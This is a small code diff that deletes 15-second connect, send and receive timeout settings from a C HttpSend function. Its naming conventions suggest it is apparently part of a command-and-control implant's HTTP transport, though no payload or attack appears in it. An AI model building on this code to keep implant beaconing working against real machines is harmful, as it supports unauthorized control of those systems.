@@ -67,13 +67,6 @@ BOOL HttpSend(
             PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
             goto LEAVE;
         }
-
-        /* Bound all network I/O to 15 s to prevent indefinite hangs when the
-           WFP non-paged pool is exhausted or the network stack is wedged. */
-        DWORD HttpTimeout = 15000;
-        Instance->Win32.WinHttpSetOption( Instance->hHttpSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &HttpTimeout, sizeof( DWORD ) );
-        Instance->Win32.WinHttpSetOption( Instance->hHttpSession, WINHTTP_OPTION_SEND_TIMEOUT,    &HttpTimeout, sizeof( DWORD ) );
-        Instance->Win32.WinHttpSetOption( Instance->hHttpSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &HttpTimeout, sizeof( DWORD ) );
     }
 
     /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
